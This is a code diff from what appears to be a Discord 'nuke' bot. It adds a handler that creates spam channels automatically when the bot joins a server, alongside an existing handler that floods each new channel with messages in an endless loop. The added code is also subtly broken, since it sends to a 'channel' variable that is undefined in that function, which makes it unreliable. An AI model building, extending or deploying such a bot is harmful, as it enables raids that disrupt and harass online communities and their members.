@@ -118,9 +118,15 @@ async def on_guild_channel_create(channel):
   while True:
     await channel.send(random.choice(SPAM_MESSAGE))
 
+# Nuke on  join (TESTING NOT 100% SUCCESS RATE!!!)
 @client.event
 async def on_guild_join(guild):
-  print(f'  [{Fore.GREEN}+{Fore.RESET}] Joined {guild.name}')
+    print(f'  [{Fore.GREEN}+{Fore.RESET}] Joined {guild.name}')
+    amount = 1
+    for i in range(amount):
+       await guild.create_text_channel(random.choice(SPAM_CHANNEL))
+       print(f'  [{Fore.GREEN}+{Fore.RESET}] Created new text channel')
+    await channel.send('?help')
 
 @client.event
 async def on_guild_remove(guild):
